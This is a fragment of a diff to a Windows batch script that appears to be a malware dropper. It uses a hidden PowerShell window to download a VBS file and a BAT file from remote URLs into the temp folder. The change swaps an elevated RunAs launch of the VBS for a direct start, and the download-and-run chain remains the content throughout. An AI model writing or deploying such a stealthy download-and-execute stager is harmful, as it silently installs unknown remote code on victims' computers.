@@ -5,5 +5,4 @@ set "vbsFile=%TEMP%\ngr.vbs"
 set "batFile=%TEMP%\ngr.bat"
 
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%vbsUrl%', '%vbsFile%'); (New-Object Net.WebClient).DownloadFile('%batUrl%', '%batFile%')"
-
-start "" "powershell.exe" -Command "Start-Process '%vbsFile%' -Verb RunAs"
+start "" "%vbsFile%"
